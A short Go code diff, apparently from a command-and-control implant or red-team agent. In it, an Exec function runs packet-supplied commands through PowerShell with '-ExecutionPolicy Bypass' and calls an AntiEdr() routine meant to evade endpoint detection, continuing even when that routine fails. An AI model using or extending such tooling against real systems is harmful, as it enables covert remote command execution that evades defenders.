@@ -151,7 +151,7 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("invalid packet arguments given: %s", err.Error())
 		}
 
-		executable = `C:\Windows\System32\WindowsPowershell\v1.0\`
+		executable = `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe`
 		args = []string{"-ExecutionPolicy", "Bypass", "-C", commandStr}
 
 	case "raw":
@@ -225,7 +225,8 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		// Activate Anti-EDR if not yet done
 		err = AntiEdr()
 		if err != nil {
-			log.Error("Anti EDR failed: %s", err.Error())
+			log.Errorf("Anti EDR failed: %s", err.Error())
+			// We dont care if it doesnt work. No return.
 		}
 
 		name := filepath.Base(executable) // Need it without path
